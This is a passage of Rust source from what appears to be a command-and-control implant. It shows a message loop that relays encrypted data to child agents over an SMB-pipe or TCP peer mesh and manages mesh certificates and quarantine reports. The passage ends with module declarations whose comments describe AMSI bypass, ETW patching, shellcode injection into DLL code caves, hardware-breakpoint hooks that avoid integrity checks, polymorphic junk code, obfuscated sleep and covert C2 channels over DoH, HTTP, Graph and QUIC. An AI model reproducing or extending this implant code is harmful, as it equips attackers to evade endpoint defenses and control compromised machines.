                        let _ = sender.send(encrypted_blob);
                    } else {
                        warn!(
                            "Received ModuleResponse for unknown module_id '{}'",
                            module_id
                        );
                    }
                }
                Ok(Message::P2pToChild {
                    child_link_id,
                    data,
                }) => {
                    // Server → child: re-encrypt with child's per-link key
                    // and send as DataForward P2P frame.
                    #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
                    {
                        info!(
                            "P2pToChild received: forwarding {} bytes to child link {:#010X}",
                            data.len(),
                            child_link_id
                        );
                        let mesh_arc = self.p2p_mesh.clone();
                        let mut mesh = mesh_arc.lock().await;
                        match p2p::forward_to_child(&mut mesh, child_link_id, &data).await {
                            Ok(()) => {
                                tracing::debug!(
                                    "P2P data forwarded to child {:#010X} ({} bytes)",
                                    child_link_id,
                                    data.len()
                                );
                            }
                            Err(e) => {
                                error!(
                                    "P2P forward_to_child failed for link {:#010X}: {}",
                                    child_link_id, e
                                );
                            }
                        }
                    }
                    #[cfg(not(any(
                        all(windows, feature = "smb-pipe-transport"),
                        feature = "p2p-tcp"
                    )))]
                    {
                        let _ = (child_link_id, data);
                        warn!("P2pToChild received but no P2P transport feature enabled");
                    }
                }
                Ok(Message::MeshCertificateIssuance { certificate }) => {
                    info!("MeshCertificateIssuance received — storing mesh certificate");
                    let mut mesh_guard = self.p2p_mesh.lock().await;
                    if let Err(e) = mesh_guard.store_mesh_certificate(certificate) {
                        warn!("rejected mesh certificate from server: {e}");
                    }
                }
                Ok(Message::MeshCertificateRevocation {
                    revoked_agent_id_hash,
                }) => {
                    info!(
                        "MeshCertificateRevocation received — revoking agent hash {:?}",
                        revoked_agent_id_hash
                    );
                    let mut mesh_guard = self.p2p_mesh.lock().await;
                    let terminated =
                        mesh_guard.handle_certificate_revocation(revoked_agent_id_hash);
                    if !terminated.is_empty() {
                        info!(
                            "certificate revocation terminated {} link(s)",
                            terminated.len()
                        );
                    }
                }
                Ok(Message::MeshCertificateRenewal) => {
                    info!("MeshCertificateRenewal received — requesting cert renewal");
                    // Request a new certificate from the server via outbound.
                    let out_tx = outbound_tx.clone();
                    let _ = out_tx.send(Message::MeshCertificateRenewal).await;
                }
                Ok(Message::MeshQuarantineReport {
                    quarantined_agent_id_hash,
                    reason,
                    evidence_hash,
                }) => {
                    info!(
                        "MeshQuarantineReport: agent hash {:?} reason={} — forwarding upstream",
                        quarantined_agent_id_hash, reason
                    );
                    let out_tx = outbound_tx.clone();
                    let _ = out_tx
                        .send(Message::MeshQuarantineReport {
                            quarantined_agent_id_hash,
                            reason,
                            evidence_hash,
                        })
                        .await;
                }
                Ok(_) => {} // ignore heartbeats etc.
                Err(e) => {
                    error!("Transport error: {}", e);
                    // Drain tasks before returning error
                    while tasks.join_next().await.is_some() {}
                    return Err(e);
                }
            }
        }

        while tasks.join_next().await.is_some() {}
        Ok(())
    }
}

pub mod amsi_defense;
#[cfg(windows)]
pub mod callback_exec;
// Code cave allocator: finds padding bytes in `.text` sections of loaded DLLs
// for placing shellcode without new executable allocations. Used by
// callback-based injection (injection::callback_exec) and other techniques
// that require stealthy code placement. Works on both x86_64 and aarch64
// Windows targets.
#[cfg(windows)]
pub mod code_cave;
pub mod etw_patch;
pub mod evasion;

// General-purpose hardware-breakpoint hooking framework using x86_64 debug
// registers (Dr0–Dr3) and a VEH handler.  Provides invisible hooks that do
// not modify any bytes in the target function — immune to code-integrity
// checks.  Manages up to 4 simultaneous breakpoints with per-slot callback
// dispatch.  Includes integrations for ETW suppression and AMSI bypass.
// Windows x86_64 only, gated by `hw-bp-hook` (implies `direct-syscalls`).
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub mod hw_bp_hook;

pub mod stub;

// Inserting some random junk compilation artifacts (FR-2)
pub fn polymorph() {
    junk_macro::insert_junk!();
}
pub mod injection;

pub mod obfuscated_sleep;

/// Optional covert transport modules.
///
/// `c2_doh` and `c2_http` are activated only when BOTH are true:
/// 1) the corresponding Cargo feature is compiled in, and
/// 2) the malleable profile enables that transport at runtime.
///
/// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
#[cfg(feature = "doh-transport")]
pub mod c2_doh;
#[cfg(feature = "graph-transport")]
pub mod c2_graph;
#[cfg(any(feature = "http-transport", feature = "doh-transport"))]
pub mod c2_http;
#[cfg(feature = "quic-transport")]
pub mod c2_quic;
